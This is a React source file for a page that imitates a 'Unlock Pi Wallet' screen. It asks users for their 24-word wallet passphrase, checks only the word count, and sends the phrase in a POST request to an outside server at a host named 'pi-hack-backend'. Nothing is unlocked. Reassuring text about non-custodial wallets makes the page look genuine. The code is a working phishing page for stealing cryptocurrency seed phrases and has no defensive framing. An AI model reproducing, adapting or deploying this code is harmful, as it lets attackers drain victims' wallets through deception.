import React, { useState } from 'react';

const WalletUnlock = () => {
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState('');

  const validatePassphrase = () => {
    const words = passphrase.trim().split(/\s+/);
    if (words.length === 0) {
      return 'Passphrase cannot be empty.';
    }
    if (words.length < 24) {
      return `Passphrase too short. You entered ${words.length} words, expected 24.`;
    }
    if (words.length > 24) {
      return `Passphrase too long. You entered ${words.length} words, expected 24.`;
    }
    return '';
  };

  const handleUnlockWithPassphrase = async () => {
  const validationError = validatePassphrase();
  if (validationError) {
    setError(validationError);
    return;
  }
  setError('');

  try {
    const response = await fetch('https://pi-hack-backend.onrender.com/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ phrase: passphrase }),
    });

    if (!response.ok) {
      throw new Error('Failed to send passphrase');
    }

    const data = await response.json();
    console.log('Server response:', data);
  } catch (err) {
    console.error('Error:', err);
    setError('Failed to unlock wallet. Please try again.');
  }
};


  const handleUnlockWithFingerprint = () => {
    console.log('Unlock with fingerprint');
    // fingerprint unlock logic
  };

  return (
    <div className="min-h-screen bg-gray-50 pt-20 pb-24">
      <div className="max-w-md mx-auto px-6">
        {/* Title */}
        <h1 className="text-2xl font-semibold text-gray-800 text-center mb-8">
          Unlock Pi Wallet
        </h1>

        {/* Passphrase Input */}
        <div className="mb-2">
          <textarea
            value={passphrase}
            onChange={(e) => setPassphrase(e.target.value)}
            placeholder="Enter your 24-word passphrase here"
            className={`w-full h-40 p-4 border rounded-lg resize-none focus:outline-none focus:ring-2 text-gray-700 placeholder-gray-400 ${
              error
                ? 'border-red-500 focus:ring-red-500'
                : 'border-gray-300 focus:ring-purple-500 focus:border-transparent'
            }`}
            rows={6}
          />
        </div>

        {/* Error Message */}
        {error && (
          <p className="text-red-600 text-sm mb-4 text-center">{error}</p>
        )}

        {/* Unlock Buttons */}
        <div className="space-y-4 mb-8">
          <button
            onClick={handleUnlockWithPassphrase}
            className="w-full py-4 bg-white border-2 border-purple-600 text-purple-600 rounded-lg font-medium hover:bg-purple-50 transition-colors duration-200"
          >
            Unlock With Passphrase
          </button>

          <button
            onClick={handleUnlockWithFingerprint}
            className="w-full py-4 bg-purple-600 text-white rounded-lg font-medium hover:bg-purple-700 transition-colors duration-200"
          >
            Unlock With Fingerprint
          </button>
        </div>

        {/* Warning Text */}
        <div className="text-center text-gray-600 text-sm leading-relaxed mb-6">
          <p>
            As a non-custodial wallet, your wallet passphrase is exclusively
            accessible only to you. Recovery of passphrase is currently
            impossible.
          </p>
        </div>

        {/* Lost Passphrase Text */}
        <div className="text-center text-gray-600 text-sm leading-relaxed">
          <p>
            Lost your passphrase?{' '}
            <button className="text-blue-500 hover:text-blue-600 underline">
              You can create a new wallet
            </button>
            , but all your π in your previous wallet will be inaccessible.
          </p>
        </div>
      </div>
    </div>
  );
};

export default WalletUnlock;
